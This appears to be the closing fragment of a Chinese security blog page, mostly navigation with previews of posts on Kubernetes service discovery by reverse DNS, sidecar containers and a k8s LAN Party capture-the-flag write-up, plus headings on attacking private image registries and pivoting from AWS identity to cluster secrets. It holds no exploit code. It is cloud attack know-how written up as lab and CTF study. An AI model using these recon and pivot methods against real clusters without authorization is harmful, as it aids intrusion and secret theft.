因此也单独写了一篇文章https://starven-l.github.io/2025/07/04/k8s-internal-service-Discovery-k8s-service%E7%89%B9%E6%80%A7ip%E5%8F%8D%E8%A7%A3%E5%9F%9F%E5%90%8D%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6/ 简要概述呢其实就是：  k8s集群里面不支持ICMP协议（也就不能用ping来探测服务），原理是因为kube-proxy使用iptables来进行路由转发，但是其默认转发规则是禁止了icmp协议的，因此iptables模式下，无法ping通任何svc,包括clusterip.（除非手动...</div></div></div></a><a class="pagination-related" href="/2025/07/04/k8s-internal-service-Discovery-k8s-service%E7%89%B9%E6%80%A7ip%E5%8F%8D%E8%A7%A3%E5%9F%9F%E5%90%8D%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6/" title="k8s internal service Discovery - k8s service特性ip反解域名原理研究"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">k8s internal service Discovery - k8s service特性ip反解域名原理研究</div></div><div class="info-2"><div class="info-item-1">Referencehttps://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#checking-environment-behaviour 【原理分析文章，主要细啃国外这篇文章，分析得很好】 https://github.com/Esonhugh/k8spider 【k8spider工具地址】 https://tari.moe/2024/k8slanparty.html 【k8s lan party writeup】 k8s - Special Recon先来看看针对k8s集群里面需要收集哪些信息？ 集群ip，port，命名空间，API server，secret，token等 1env | grep &quot;KUBERNETES&quot;  123456789player@wiz-k8s-lan-party:/home$ env | grep &quot;KUBERNETES&quot;KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_...</div></div></div></a><a class="pagination-related" href="/2025/07/04/k8s-sidecar%E5%AE%B9%E5%99%A8-app%E4%B8%BB%E5%AE%B9%E5%99%A8-init%E5%AE%B9%E5%99%A8%E7%9A%84%E5%85%B3%E8%81%94%E4%B8%8E%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" title="k8s sidecar容器 &amp; app主容器 &amp; init容器的关联与区别以及安全问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">k8s sidecar容器 &amp; app主容器 &amp; init容器的关联与区别以及安全问题</div></div><div class="info-2"><div class="info-item-1">Referencehttps://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/ What is Sidecat？官方文档提到一个特性【FEATURE STATE: Kubernetes v1.33 [stable] (enabled by default: true)】 通常，一个 Pod 中只有一个应用容器 Web 应用程序需要的本地 Web 服务器就是 sidecar Sidecar 容器是与主应用程序容器一起运行在同一 Pod 中的辅助容器。这些容器用于通过提供其他服务或功能（如日志记录、监控、安全或数据同步）来增强或扩展主应用程序容器的功能，而无需直接更改主应用程序代码 Sidecar containers in Kubernetes文档写到：Kubernetes implements sidecar containers as a special case of init containers; sidecar containers remain running after Pod star...</div></div></div></a><a class="pagination-related" href="/2025/07/08/k8s-LAN-Party-wp-By-Starven/" title="k8s LAN Party wp - By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">k8s LAN Party wp - By.Starven</div></div><div class="info-2"><div class="info-item-1">环境背景 背景：已经获取pod的shell  Level1 - Recon相关原理分析文章之前已经写在了【k8s internal service Discovery - k8s service特性ip反解域名原理研究】一文 reverse dns scanning即可扫到存放flag的服务，curl一下就拿到flag了 Level2 - Fiding Neighbours先利用service特性ip反解扫一下目前处于的B段有哪些服务 发现reporting-service.k8s-lan-party.svc.cluster.local但是没东西  由于题目描述说Sidecar，前面也专门写了文章学习这个  说明当前容器处于的Pod是还存在其他的容器的（按照题目说就是sidecar容器） 而我们知道The sidecar container shares the same lifecycle, resources, and network namespace as the main container. hint2提到我们的环境有tcpdump  同时我们知道由于sidecar容...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Starven</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Starven-L" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="tencent://message/?uin=1732293304&amp;Site=&amp;Menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%ADkubectl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">容器信息收集中kubectl常用命令总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attack-Docker%E6%88%96ECR%E7%AD%89%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93"><span class="toc-number">2.</span> <span class="toc-text">Attack Docker或ECR等私有镜像仓库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8EAWS%E8%BA%AB%E4%BB%BD-%E2%80%94-Node%E5%B1%82-%E6%A8%A1%E6%8B%9FNode%E7%9A%84IAM-%E2%80%94-k8s%E9%9B%86%E7%BE%A4%E5%86%85%E9%83%A8secrets"><span class="toc-number">3.</span> <span class="toc-text">从AWS身份 —&gt; Node层(模拟Node的IAM) —&gt; k8s集群内部secrets</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Trust-Policy%E7%9A%84AssumeRoleWithWebIdentity%E5%92%8CIAM-Policy"><span class="toc-number">4.</span> <span class="toc-text">Trust Policy的AssumeRoleWithWebIdentity和IAM Policy</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</a><time datetime="2025-07-16T06:31:39.000Z" title="发表于 2025-07-16 14:31:39">2025-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/" title="Exchange 攻击专题">Exchange 攻击专题</a><time datetime="2025-07-14T15:39:37.000Z" title="发表于 2025-07-14 23:39:37">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/MCP%E5%A4%A7%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE/" title="MCP大模型上下文协议">MCP大模型上下文协议</a><time datetime="2025-07-14T14:44:49.000Z" title="发表于 2025-07-14 22:44:49">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/EKS-Cluster-Games-Summary/" title="EKS Cluster Games - Summary">EKS Cluster Games - Summary</a><time datetime="2025-07-10T03:37:11.000Z" title="发表于 2025-07-10 11:37:11">2025-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/09/EKS-Cluster-Games-wp-By-Starven/" title="EKS Cluster Games wp - By.Starven">EKS Cluster Games wp - By.Starven</a><time datetime="2025-07-09T09:37:27.000Z" title="发表于 2025-07-09 17:37:27">2025-07-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Starven</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>